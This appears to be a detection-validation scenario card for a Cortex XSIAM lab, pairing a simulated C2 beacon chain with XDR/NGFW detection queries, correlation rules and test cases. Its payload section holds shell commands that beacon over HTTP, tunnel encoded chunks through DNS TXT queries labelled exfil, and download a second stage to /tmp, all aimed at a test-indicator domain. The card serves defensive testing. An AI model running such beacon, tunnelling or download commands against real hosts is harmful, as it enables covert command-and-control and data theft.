identity.name: C2 Beacon Callback — NGFW + XDR Causality Stitch (T1071.001)
identity.summary: A web service account on a DMZ host spawns an interactive shell, then beacons over HTTP to a known-bad indicator, runs a DNS TXT tunnel loop, and stages a second-stage download. The Cortex value is cross-plane stitching: XSIAM joins the NGFW network_story session leg to the XDR xdr_data process leg on a shared src_host inside a 60s window so the curl/dig process lineage and the outbound beacon…
identity.description: This scenario validates XSIAM's correlation engine on the canonical C2-beacon kill chain split across two telemetry planes. The endpoint plane (Cortex XDR Agent) sees a shell spawned from www-data, then curl invoked with a beacon user-agent and dig invoked in a loop — process-creation events in xdr_data. The network plane (NGFW Network Security Analytics, surfaced into XSIAM as network_story / pan_ngfw_traffic and pan_dns) sees the repetitive outbound HTTP sessions to testmynids.org and the high-entropy DNS TXT burst. Neither plane alone tells the full story: the network plane lacks the process that opened the socket, and the endpoint plane lacks the firewall's beacon-periodicity verdict. The correlation rules in this card join the two legs on src_host within the scenario's 60s window, demonstrating the F2 Causality-Chain-Completeness KPI (>= 2 distinct planes under one incident_id). All HTTP/DNS targets are 3CORESec testmynids.org test indicators — safe by design.

techniques.name: Command and Scripting Interpreter: Unix Shell

execution.framework_reference_id: T1071.001 — Atomic Test (C2 over HTTP) combined with T1572 DNS tunneling and T1105 ingress transfer

prerequisites.description: Cortex XDR Linux agent installed and reporting healthy on the DMZ endpoint.
prerequisites.check_command: systemctl is-active cortex-agent || ps aux | grep -i traps

prerequisites.description: NGFW inline (or Suricata lab stand-in) forwarding session + DNS logs to the XSIAM collector so the network leg is ingested into network_story / pan_ngfw_traffic / pan_dns.
prerequisites.check_command: echo 'verify pan_ngfw_traffic dataset is receiving logs in XSIAM'

payload.code:
# All HTTP/DNS targets are 3CORESec testmynids.org test indicators — safe by design.
bash -c 'id; whoami; uname -a'
for i in 1 2 3 4 5; do curl -sSL -m 10 -A 'Mozilla/5.0 (compatible; CortexSimBeacon/1.0)' "http://testmynids.org/uid/index.html?beacon=$i" -o /dev/null || true; sleep 12; done
for i in $(seq 1 20); do dig +short TXT "exfil-$(echo -n "payload_chunk_$i" | base32 | tr -d = | head -c 30).testmynids.org" @1.1.1.1 > /dev/null || true; sleep 1; done
curl -sSL -o /tmp/cortexsim_stage2.sh http://testmynids.org/uid/index.html

expected_artifacts.description: Interactive bash spawned under the www-data identity.
curl invoked with the CortexSimBeacon user-agent.
Repetitive outbound HTTP sessions from the DMZ host to testmynids.org.
High-entropy DNS TXT queries under testmynids.org.
Second-stage file written to /tmp by curl.

cleanup.code:
rm -f /tmp/cortexsim_stage2.sh
echo '[CortexSim] SIM-MP-001 cleanup complete - no persistent artifacts'

iocs.context: 3CORESec test indicator used as the C2 / DNS-tunnel / ingress-transfer endpoint. In a real environment this slot is the actual TIM-fed C2 domain; the IOC match on the downloaded URL is cross-referenced against the endpoint file hash to confirm the stitched download leg.

biocs.name: MP-001 Interactive Shell Spawned From www-data Service Context
biocs.description: XDR — interactive bash spawned from www-data service context. A non-login web service identity spawns an interactive shell, the endpoint leg of the C2 chain.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name in ("bash", "sh")
| filter actor_effective_username in ("www-data", "nobody", "apache", "nginx")
| filter causality_actor_process_image_name in ("apache2", "nginx", "php-fpm", "node", "httpd")

biocs.name: MP-001 Curl Beacon With Suspicious User-Agent From www-data
biocs.description: XDR — curl executed from www-data with suspicious user-agent. The endpoint process that opens the outbound HTTP beacon socket, providing the lineage leg the NGFW session lacks.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name in ("curl", "wget")
| filter action_process_image_command_line contains_any ("CortexSimBeacon", "-A ", "--user-agent")
| filter actor_effective_username in ("www-data", "nobody", "apache", "nginx")

biocs.name: MP-001 Curl Wrote Second-Stage File To Tmp From Service Account
biocs.description: XDR — file written to /tmp/ by curl from service account. Ingress tool transfer: curl downloads a second stage into a world-writable path under a service identity.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.FILE
| filter event_sub_type in (ENUM.FILE_CREATE_NEW, ENUM.FILE_WRITE)
| filter actor_process_image_name in ("curl", "wget")
| filter action_file_path contains "/tmp/"
| filter actor_effective_username in ("www-data", "nobody", "apache", "nginx")

xql_queries.name: MP-001 NGFW Repetitive HTTP Beacon To testmynids
xql_queries.query:
dataset = pan_ngfw_traffic
| filter _time > to_timestamp(current_time() - 1800)
| filter dst_host = "testmynids.org" and bytes_sent > 0
| comp count() as beacon_hits, count_distinct(dst_port) as ports by source_ip
| filter beacon_hits >= 5
| fields source_ip, beacon_hits, ports

xql_queries.name: MP-001 Stitch NGFW Session And XDR Process By Src Host
xql_queries.query:
dataset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter (event_type = ENUM.NETWORK and action_external_hostname = "testmynids.org") or (event_type = ENUM.PROCESS and actor_process_image_name = "curl")
| comp count_distinct(_product) as plane_count, count_distinct(incident_id) as incident_count by action_local_ip
| filter plane_count >= 2 and incident_count = 1
| fields action_local_ip, plane_count, incident_count

xql_queries.name: MP-001 NGFW DNS TXT High Entropy Burst
xql_queries.query:
dataset = pan_dns
| filter _time > to_timestamp(current_time() - 1800)
| filter dns_query_type = "TXT" and dns_query_name contains ".testmynids.org"
| comp count() as txt_queries, count_distinct(dns_query_name) as distinct_labels by source_ip
| filter txt_queries >= 10
| fields source_ip, txt_queries, distinct_labels

xql_queries.name: MP-001 Repetitive Dig TXT From Service Account
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name in ("dig", "nslookup", "host")
| filter action_process_image_command_line contains "TXT"
| comp count() as dig_count by agent_hostname, actor_effective_username
| filter dig_count >= 10
| fields agent_hostname, actor_effective_username, dig_count

xql_queries.name: MP-001 Stitch DNS Exfil With Process Lineage
xql_queries.query:
dataset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter (event_type = ENUM.PROCESS and actor_process_image_name = "dig") or (event_type = ENUM.NETWORK and action_external_port = 53)
| comp count_distinct(_product) as plane_count, count_distinct(incident_id) as incident_count by action_local_ip
| filter plane_count >= 2 and incident_count = 1
| fields action_local_ip, plane_count, incident_count

xql_queries.name: MP-001 NGFW Download From IOC Listed Domain
xql_queries.query:
dataset = pan_ngfw_traffic
| filter _time > to_timestamp(current_time() - 1800)
| filter dst_host = "testmynids.org" and url contains "/uid/index.html"
| filter app in ("web-browsing", "http", "ssl")
| comp count() as download_hits by source_ip, dst_host
| fields source_ip, dst_host, download_hits

correlation_rules.name: C2 Beacon Cross-Plane Stitch — NGFW Session + XDR Process
correlation_rules.logic: (XQL(MP-001 NGFW Repetitive HTTP Beacon To testmynids) AND (BIOC(MP-001 Curl Beacon With Suspicious User-Agent From www-data) OR BIOC(MP-001 Interactive Shell Spawned From www-data Service Context))) -> join on src_host within 60s

correlation_rules.name: DNS Tunnel Exfil Cross-Plane Stitch — NGFW DNS Anomaly + XDR Dig Loop
correlation_rules.logic: (XQL(MP-001 NGFW DNS TXT High Entropy Burst) AND XQL(MP-001 Repetitive Dig TXT From Service Account)) -> join on src_host within 60s

correlation_rules.name: Ingress Transfer IOC Stitch — NGFW Download + XDR Tmp Write + TIM IOC
correlation_rules.logic: (XQL(MP-001 NGFW Download From IOC Listed Domain) AND BIOC(MP-001 Curl Wrote Second-Stage File To Tmp From Service Account) AND IOC(domain: testmynids.org)) -> join on src_host within 60s

analytics_modules: Cortex XSIAM Network Security Analytics — periodic beacon detection
Cortex XSIAM Analytics — DNS tunneling / high-entropy label anomaly
Cortex XSIAM Correlation Engine — cross-dataset causality stitching by src_host

products.evidence_query: dataset = pan_ngfw_traffic | filter dst_host = "testmynids.org" | comp count() as hits by source_ip | filter hits >= 5
Correlation CR-MP-0001/0002/0003 join NGFW network_story legs to XDR process legs on src_host within 60s, yielding incidents with >= 2 planes.
preset = xdr_data | filter actor_process_image_name = "curl" and actor_effective_username = "www-data" | fields _time, agent_hostname, action_process_image_command_line
Playbook isolates the DMZ host, blocks the C2 domain at NGFW, and enriches with TIM.

use_cases.name: Cross-Plane Incident Stitching — NGFW Session ↔ XDR Process Lineage
use_cases.description: Validate that XSIAM stitches an NGFW C2 beacon session and the XDR process that opened it into a single causality-complete incident.

test_cases.objective: Each plane fires its own detection (NGFW beacon analytics + XDR curl/shell BIOC).
preconditions: Cortex XDR Linux agent >= 8.4.0 healthy on the DMZ host.
NGFW (or Suricata lab) forwarding session + DNS logs into XSIAM.
steps: Confirm the NGFW beacon XQL and the XDR curl BIOC each return rows.
success_criteria: XQL `MP-001 NGFW Repetitive HTTP Beacon To testmynids` returns >= 1 row.
BIOC `MP-001 Curl Beacon With Suspicious User-Agent From www-data` fires within 60s.

test_cases.objective: Both legs stitch into one incident with >= 2 planes (Causality Chain Completeness KPI).
success_criteria: Correlation `CR-MP-0001` groups the NGFW session and XDR process on src_host into one incident_id.
Stitch XQL returns plane_count >= 2 and incident_count = 1.

preventive_controls: Enable NGFW threat prevention + DNS Security with the C2 / DNS-tunnel signature set inline on DMZ egress.
Default-deny egress from DMZ server subnets; allow only required destinations.
Run web application services under least-privilege accounts with no interactive shell.
Enable Cortex XDR BTP reverse-shell + suspicious-download prevention on server tiers.
detection_engineering: Stitch NGFW periodic-beacon verdicts to the XDR process that created the socket on a shared src_host within a tight time window.
Alert on dig/nslookup loops producing high-entropy TXT labels from service accounts.
Cross-reference downloaded URLs against TIM IOC feeds and the endpoint file hash to confirm ingress-transfer intent.

references.title: Unit42 - Cobalt Strike Malleable C2 Profiles

Enriched identity + panw_mapping. Promoted to active.
